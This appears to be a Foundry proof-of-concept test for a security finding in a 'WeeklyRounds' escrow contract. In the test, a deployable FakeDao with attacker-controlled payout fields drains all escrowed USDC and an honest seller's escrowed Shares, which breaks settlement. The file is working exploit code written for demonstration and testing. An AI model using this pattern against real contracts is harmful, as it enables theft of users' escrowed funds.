// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {WeeklyRounds} from "../src/WeeklyRounds.sol";

contract Tok is ERC20 {
    address public exitExchange;
    address public lockGuard;
    constructor(string memory n) ERC20(n, n) {}
    function mint(address to, uint256 a) external { _mint(to, a); }
    function setEx(address e) external { exitExchange = e; }
}

/// A DAO-shaped contract anyone can deploy: every answer is the attacker's.
contract FakeDao {
    Tok public shares;
    Tok public loot;
    address public payouts;
    constructor() { shares = new Tok("FS"); loot = new Tok("FL"); payouts = address(this); }
    function votingWeight() external view returns (address) { return address(this); }
    // payout-module face
    uint256 public perUnit;
    IERC20 public currency;
    function owed(address) external pure returns (uint256) { return 0; }
    function withdraw(address) external {}
    function arm(uint256 p, IERC20 c) external { perUnit = p; currency = c; }
    function setEx(address e) external { shares.setEx(e); }
    function mintTo(address to, uint256 a) external { shares.mint(to, a); }
    function ragequit(address[] calldata, uint256, uint256) external {}
}

contract HonestDao {
    Tok public shares;
    Tok public loot;
    address public payouts;
    constructor() { shares = new Tok("S"); loot = new Tok("L"); }
    function votingWeight() external view returns (address) { return address(this); }
    function setEx(address e) external { shares.setEx(e); }
    function mintTo(address to, uint256 a) external { shares.mint(to, a); }
}

contract PocTest is Test {
    Tok usd;
    WeeklyRounds rounds;

    function setUp() public {
        usd = new Tok("USD");
        rounds = new WeeklyRounds(IERC20(address(usd)), 1e4);
    }

    function test_fake_dao_drains_every_round_escrow() public {
        // An honest DAO's round: a buyer escrows 1,300 USDC, a seller escrows 1,000 Shares.
        HonestDao h = new HonestDao();
        h.setEx(address(rounds));
        h.mintTo(address(0xA), 1000e18);
        usd.mint(address(h), 1000e6);
        uint256 id = rounds.open(address(h));
        vm.startPrank(address(0xA));
        h.shares().approve(address(rounds), type(uint256).max);
        rounds.sell(id, 1000e18, 10);
        vm.stopPrank();
        usd.mint(address(0xB), 2000e6);
        vm.startPrank(address(0xB));
        usd.approve(address(rounds), type(uint256).max);
        rounds.bid(id, 1000e18, 30);
        vm.stopPrank();
        uint256 escrowUsd = usd.balanceOf(address(rounds));
        assertEq(escrowUsd, 1300e6);

        // The attacker.
        address mallory = address(0xBAD);
        vm.startPrank(mallory);
        FakeDao f = new FakeDao();
        f.setEx(address(rounds));
        f.mintTo(mallory, 1);
        uint256 fid = rounds.open(address(f));
        f.shares().approve(address(rounds), 1);
        rounds.sell(fid, 1, 0); // sellPerUnit = 0
        // per-unit jumps so that 1 unit "earned" the whole USDC balance, paid in the real currency
        f.arm(escrowUsd * 2 ** 96, IERC20(address(usd)));
        address[] memory none = new address[](0);
        rounds.cancelSell(fid, none);
        vm.stopPrank();
        assertEq(usd.balanceOf(mallory), 1300e6, "all escrow stolen");
        assertEq(usd.balanceOf(address(rounds)), 0);

        // Second pass: the honest seller's escrowed Shares, too (the real Shares token named as "currency").
        vm.startPrank(mallory);
        f.mintTo(mallory, 1);
        f.shares().approve(address(rounds), 1);
        // a new fake DAO is needed for a fresh round in bidding (or reuse the same round with a second address)
        FakeDao f2 = new FakeDao();
        f2.setEx(address(rounds));
        f2.mintTo(mallory, 1);
        uint256 fid2 = rounds.open(address(f2));
        f2.shares().approve(address(rounds), 1);
        rounds.sell(fid2, 1, 0);
        f2.arm(1000e18 * 2 ** 96, IERC20(address(h.shares())));
        rounds.cancelSell(fid2, none);
        vm.stopPrank();
        assertEq(h.shares().balanceOf(mallory), 1000e18, "escrowed Shares stolen");

        // The honest round can no longer pay out: settle then claim reverts.
        vm.warp(block.timestamp + 3 days);
        (uint256 step,,) = rounds.clearingStep(id);
        rounds.settle(id, step);
        vm.expectRevert();
        rounds.claim(id, address(0xB));
    }
}
